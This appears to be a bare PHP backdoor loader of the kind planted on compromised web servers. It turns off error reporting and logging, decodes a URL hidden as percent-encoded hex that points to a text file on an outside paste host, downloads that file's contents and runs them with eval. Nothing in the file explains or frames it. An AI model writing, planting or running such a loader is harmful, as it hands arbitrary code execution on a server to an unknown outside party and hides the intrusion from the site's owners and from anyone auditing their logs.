<?php

@set_time_limit(0);
@ini_set('html_errors', '0');
@clearstatcache();
$d_17b31f50 = false;
if ($d_17b31f50) {
    error_reporting(E_ERROR | E_WARNING | E_PARSE | E_NOTICE);
    @ini_set('display_errors', '1');
    @ini_set('log_errors', '1');
} else {
    error_reporting(0);
    @ini_set('display_errors', '0');
    @ini_set('log_errors', '0');
}

$handle = fopen(urldecode('%68%74%74%70%73%3a%2f%2f%70%61%73%74%65%2e%6d%79%63%6f%6e%61%6e%2e%6e%65%74%2f%34%39%36%39%35%32%2e%74%78%74'), 'r');
$content = stream_get_contents($handle);
fclose($handle);
eval('?>'.$content);

?>